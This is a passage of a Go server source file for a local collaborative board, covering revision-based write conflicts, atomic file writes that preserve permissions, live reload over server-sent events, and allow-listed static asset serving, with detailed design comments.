// wrong, and it is refused rather than quietly downgraded.
func baseToken(v any) (string, bool) {
	switch got := v.(type) {
	case nil:
		return "", true
	case string:
		return got, true
	case float64:
		if got != math.Trunc(got) {
			return "", false
		}
		return strconv.FormatInt(int64(got), 10), true
	default:
		return "", false
	}
}

func revisionOf(raw []byte) revision {
	var cur map[string]any
	if len(raw) == 0 || json.Unmarshal(raw, &cur) != nil {
		return revision{}
	}
	got := revision{}
	got.updatedAt, _ = cur["updatedAt"].(string)
	if n, ok := cur["rev"].(float64); ok {
		got.rev, got.had = int(n), true
	}
	return got
}

// legacy reports that the live document predates the revision token.
func (v revision) legacy() bool { return !v.had }

// refuse decides whether a submitted __base may write over this document, and
// returns the refusal when it may not.
//
// Two shapes of base arrive. A number is a revision and is compared as one. A
// non-numeric string is a timestamp from before this change, and it is accepted
// ONLY while the live document has no `rev` of its own — that is a board whose
// last write predates the upgrade, whose readers cannot have a revision to send,
// and which gets one on this very write. Once a `rev` is on disk a timestamp base
// is refused outright, because accepting it would reopen the same-millisecond
// hole for every writer that kept sending the old field.
func (v revision) refuse(base string) *apiError {
	if n, err := strconv.Atoi(strings.TrimSpace(base)); err == nil {
		if n == v.rev {
			return nil
		}
		return &apiError{http.StatusConflict, map[string]string{
			"error":  "conflict",
			"live":   strconv.Itoa(v.rev),
			"base":   base,
			"reason": fmt.Sprintf("your base is rev %d and the board is at rev %d — re-read the document, redo the edit, apply again", n, v.rev),
		}}
	}
	if v.legacy() && base == v.updatedAt {
		return nil
	}
	return &apiError{http.StatusConflict, map[string]string{
		"error":  "conflict",
		"live":   strconv.Itoa(v.rev),
		"base":   base,
		"reason": "__base must be the `rev` of the document you read; a timestamp is the old token and is no longer compared",
	}}
}

// Write via a temp file in the same directory, then rename. A reader (Claude
// Code, or another browser) therefore never observes a half-written file.
//
// THE MODE IS PART OF THE CONTRACT, and this got it wrong for as long as it
// used os.CreateTemp: that creates at 0600 and the rename carries the mode with
// it, so the state file `aboard init` wrote at 0644 silently dropped to 0600 on
// the server's first accepted write. The board's whole purpose is to be read by
// the tools the developer already runs — their editor, a VS Code extension,
// every other agent session — and 0600 is the mode for a service holding other
// people's secrets, which this is not (see the file-mode note in init.go).
//
// Two rules, in this order:
//
//   - A file that already exists keeps ITS mode. If somebody chose 0600 for
//     their own board, an ordinary write is not the place to overrule them.
//   - A new file is created 0o644 THROUGH THE UMASK, by asking the kernel for
//     that mode rather than chmod-ing afterwards. os.OpenFile applies the umask;
//     os.Chmod does not, and would hand a 0077 user a world-readable file they
//     had explicitly asked not to have. This is also why there is no
//     syscall.Umask call here: that is Unix-only, and this tree cross-compiles
//     for Windows.
func (s *server) writeAtomic(body []byte) error {
	mode := os.FileMode(0o644)
	if info, err := os.Stat(s.stateFile); err == nil {
		mode = info.Mode().Perm()
	}

	tmp, err := createTempFile(s.stateFile, mode)
	if err != nil {
		return err
	}
	tmpName := tmp.Name()
	defer func() { _ = os.Remove(tmpName) }()

	if _, err := tmp.Write(body); err != nil {
		_ = tmp.Close()
		return err
	}
	if err := tmp.Close(); err != nil {
		return err
	}
	return os.Rename(tmpName, s.stateFile)
}

// createTempFile is os.CreateTemp with a mode, which os.CreateTemp does not
// take — it is hard-wired to 0600. O_EXCL makes the name race-free exactly as
// CreateTemp's own loop does; the mode goes through the umask because the kernel
// applies it to O_CREATE.
func createTempFile(dest string, mode os.FileMode) (*os.File, error) {
	var lastErr error
	for range 100 {
		// math/rand, not crypto/rand, and deliberately: O_EXCL is what makes the
		// name safe, exactly as it is in os.CreateTemp's own loop. The number only
		// has to avoid a collision with a concurrent write in the same directory,
		// and the loop below handles the collision if it happens.
		name := TempFileBeside(dest, rand.Uint64()) //nolint:gosec // G404: O_EXCL provides the safety; this only avoids a retry
		f, err := os.OpenFile(name, os.O_RDWR|os.O_CREATE|os.O_EXCL, mode)
		if err == nil {
			return f, nil
		}
		if !os.IsExist(err) {
			return nil, err
		}
		lastErr = err
	}
	return nil, lastErr
}

/* ---------- live reload ---------- */

func (s *server) events(w http.ResponseWriter, r *http.Request) {
	flusher, ok := w.(http.Flusher)
	if !ok {
		http.Error(w, "streaming unsupported", http.StatusInternalServerError)
		return
	}
	w.Header().Set("Content-Type", "text/event-stream")
	w.Header().Set("Cache-Control", "no-cache")
	w.Header().Set("Connection", "keep-alive")
	w.WriteHeader(http.StatusOK)
	_, _ = io.WriteString(w, "retry: 1000\n\n")

	// Hand every client the signature of the UI it should be running, before
	// anything else. This is what makes a restart self-healing: the browser
	// reconnects on its own, sees a signature that differs from the code it
	// loaded, and reloads itself (see reload.go).
	if payload := s.uiPayload(); payload != "" {
		_, _ = fmt.Fprintf(w, "data: %s\n\n", payload)
	}
	flusher.Flush()

	ch := make(chan string, 8)
	s.mu.Lock()
	s.clients[ch] = struct{}{}
	s.mu.Unlock()

	defer func() {
		s.mu.Lock()
		delete(s.clients, ch)
		close(ch)
		s.mu.Unlock()
	}()

	for {
		select {
		case <-r.Context().Done():
			return
		case msg := <-ch:
			if _, err := fmt.Fprintf(w, "data: %s\n\n", msg); err != nil {
				return
			}
			flusher.Flush()
		}
	}
}

// guard runs one of the long-lived background goroutines so a panic inside it is
// reported through Options.Logger instead of taking the process down.
//
// Defence in depth, not the fix: nothing in the fanout path panics any more (see
// fanout). But these two are the only goroutines in the server with no HTTP
// handler above them — net/http recovers a panicking handler and keeps serving,
// while a bare `go f()` that panics ends the process — and the board dying is the
// worst failure this program has: the human's page goes blank, every session
// blocked on `wait` is released with nothing, and the instance file survives to
// point the next command at a port nobody is listening on.
//
// It does not restart the goroutine. A poll loop that panicked once will panic
// again on the next tick, and a silent restart loop is how a bug becomes a log
// nobody reads.
func (s *server) guard(name string, fn func()) {
	defer func() {
		if r := recover(); r != nil {
			s.opts.Log().Printf("panic in the %s, which has stopped: %v\n%s", name, r, debug.Stack())
		}
	}()
	fn()
}

// Poll rather than use an OS watcher: it keeps the dependency list short, and
// unlike a single-file watch it cannot be defeated by an editor replacing the
// file, which a rename-based save does.
func (s *server) watch() {
	var lastSig string
	for {
		time.Sleep(200 * time.Millisecond)
		sig := s.stateSignature()
		if sig == "" || sig == lastSig {
			continue
		}
		if lastSig != "" {
			s.broadcast()
		}
		lastSig = sig
	}
}

func (s *server) stateSignature() string {
	info, err := os.Stat(s.stateFile)
	if err != nil {
		return ""
	}
	// Size plus mtime catches everything a normal write does. Hash the content
	// only when mtime resolution could hide a fast successive write.
	body, err := os.ReadFile(s.stateFile)
	if err != nil {
		return fmt.Sprintf("%d-%d", info.Size(), info.ModTime().UnixNano())
	}
	sum := sha256.Sum256(body)
	return hex.EncodeToString(sum[:16])
}

func (s *server) broadcast() {
	s.mu.Lock()
	origin := s.pendingOrigin
	s.pendingOrigin = ""
	payload := `{"origin":null}`
	if origin != "" {
		if b, err := json.Marshal(map[string]string{"origin": origin}); err == nil {
			payload = string(b)
		}
	}
	s.mu.Unlock()

	s.fanout(payload)
}

// fanout pushes one SSE payload to every open page. Shared by the state watcher
// and by the waiter count (wait.go), which the notify button listens for.
//
// The sends happen UNDER the lock, and that is the fix for a race that killed the
// process outright. It used to copy the channels, release the lock, then send —
// and `events` unsubscribes by deleting its channel from the map AND closing it,
// so a client that hung up inside that window had its channel closed before the
// send arrived, and a send on a closed channel panics. `watch()` is a bare
// goroutine with no handler above it, so the whole server died and `aboard
// status` reported a stale record for a board that had been fine a moment ago.
//
// Under the lock rather than "delete without closing", which would also have
// worked: the alternative makes correctness depend on nobody, ever, closing a
// subscriber channel — an invariant spread across two files, enforced by nothing,
// and reinstated by the next person who reads `close(ch)` as tidy. Here the rule
// is local and visible at the site that has to obey it. It costs nothing:
// every send is already non-blocking, so a wedged client cannot hold the lock,
// and the critical section is a bounded walk over a handful of channels with no
// I/O in it.
func (s *server) fanout(payload string) {
	s.mu.Lock()
	defer s.mu.Unlock()

	for ch := range s.clients {
		select {
		case ch <- payload:
		default: // a wedged client must not stall the watcher
		}
	}
}

/* ---------- static ---------- */

func (s *server) static(w http.ResponseWriter, r *http.Request, upath string) {
	name := strings.TrimPrefix(path.Clean("/"+upath), "/")
	if name == "" || strings.Contains(name, "..") {
		http.Error(w, "forbidden", http.StatusForbidden)
		return
	}

	allowed := false
	for _, f := range serveFiles {
		if name == f {
			allowed = true
		}
	}
	for _, d := range serveDirs {
		if strings.HasPrefix(name, d+"/") {
			allowed = true
		}
	}
	if !allowed {
		http.Error(w, "forbidden", http.StatusForbidden)
		return
	}
	body, err := fs.ReadFile(s.assets, name)
	if err != nil {
		http.Error(w, "not found", http.StatusNotFound)
		return
	}
	s.writeAsset(w, r, name, body)
}

// basePlaceholder is the line aboard.html ships with, and the only thing the
// template step touches. A marker rather than a template engine: the shell is
// 56 KB of hand-written HTML and the fewer things that rewrite it, the fewer
// ways it can be rewritten wrongly.
const basePlaceholder = `window.ABOARD_BASE = "";`

// serveShell serves aboard.html with the base path injected, so every URL the
// page builds — fetches, the SSE stream, an html tab's iframe — is prefixed
// exactly the way the router expects to receive it.
func (s *server) serveShell(w http.ResponseWriter, r *http.Request) {
	body, err := fs.ReadFile(s.assets, "aboard.html")
	if err != nil {
		http.Error(w, "not found", http.StatusNotFound)
		return
	}
	want := []byte(basePlaceholder)
	if !bytes.Contains(body, want) {
		// Loud, because the page would otherwise come up looking fine and fail
		// only under a base path, in a console nobody has open.
		s.opts.Log().Printf("warning: aboard.html has no %s marker — the base path cannot be injected", basePlaceholder)
	} else if s.base != "" {
		body = bytes.Replace(body, want,
			[]byte(`window.ABOARD_BASE = "`+s.base+`";`), 1)
	}
	s.writeAsset(w, r, "aboard.html", body)
}

// writeAsset sends one asset with the caching rules that suit how it can change.
// The ETag is computed over the bytes actually sent, not the file on disk, so a
// templated shell served under two different base paths does not answer the
// second request from the first one's cache.
func (s *server) writeAsset(w http.ResponseWriter, r *http.Request, name string, body []byte) {
	if typ := mime.TypeByExtension(path.Ext(name)); typ != "" {
		w.Header().Set("Content-Type", typ)
	}

	// Embedded assets cannot change without a rebuild, so let the browser keep
	// them — this is what stops the 3.5 MB mermaid bundle being refetched on
	// every reload. In dev mode the files are being edited, so never cache.
	if s.dev {
		w.Header().Set("Cache-Control", "no-store")
	} else {
		sum := sha256.Sum256(body)
		etag := `"` + hex.EncodeToString(sum[:8]) + `"`
		w.Header().Set("ETag", etag)
		w.Header().Set("Cache-Control", "no-cache")
		if r.Header.Get("If-None-Match") == etag {
			w.WriteHeader(http.StatusNotModified)
			return
		}
	}
	_, _ = w.Write(body)
}

// writeJSON is a METHOD, and that is the whole reason it changed shape: the one
// line it logs went to the standard logger, which a host embedding this tree has
// no way to redirect. Every caller was already a *server, so the receiver costs
// nothing and closes the last hole in "server logging goes through
// Options.Logger" (aboard.go).
func (s *server) writeJSON(w http.ResponseWriter, code int, payload any) {
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Cache-Control", "no-store")
	w.WriteHeader(code)
	if err := json.NewEncoder(w).Encode(payload); err != nil {
		// The status line is already on the wire, so there is no code left to
		// change and the client sees a truncated body. Log it: a handler that
		// cannot serialise its own reply is a bug, and silence is how it stays
		// one.
		s.opts.Log().Printf("writeJSON: encoding a %d reply: %v", code, err)
	}
}
